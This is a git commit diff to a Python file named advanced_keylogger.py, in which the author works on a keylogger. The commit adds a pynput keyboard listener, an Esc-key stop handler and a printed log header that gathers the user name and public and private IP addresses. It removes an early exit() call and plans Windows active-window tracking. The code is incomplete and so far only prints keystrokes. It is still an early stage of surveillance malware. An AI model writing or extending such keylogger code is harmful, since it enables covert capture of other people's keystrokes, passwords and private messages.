e7c5b2e3a9e2d2c8b57af2436c3742edd9f4fc87
Kacper <kacwal@poczta.fm>
2019-10-20 13:41:57 +0200

    done everything i can done on mac, next i need windows

--- advanced_keylogger.py
+++ advanced_keylogger.py
@@ -1,3 +1,9 @@
+"""
+ok Mac haters
+cant get current used window on mac ->
+i have to code it on a windows computer xD
+"""
+
 from pynput.keyboard import Key, Listener
 import time
 import os
@@ -11,18 +17,23 @@ user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' b
 datetime = time.ctime(time.time())
 
 msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
-
+print(msg)
 logged_data = []
 logged_data.append(msg)
 
 old_app = ''
 delete_file = []
 
-exit()
-
 def on_press(key):
+    global old_app
+    """there i need something to listen current used window (in windows it is win32gui module)"""
     print(key)
 
+"""temporary function to stop listening when esc is pressed"""
+def on_release(key):
+    if key == Key.esc:
+        return False
+
 """keyboard listener"""
-with Listener(on_press=on_press) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
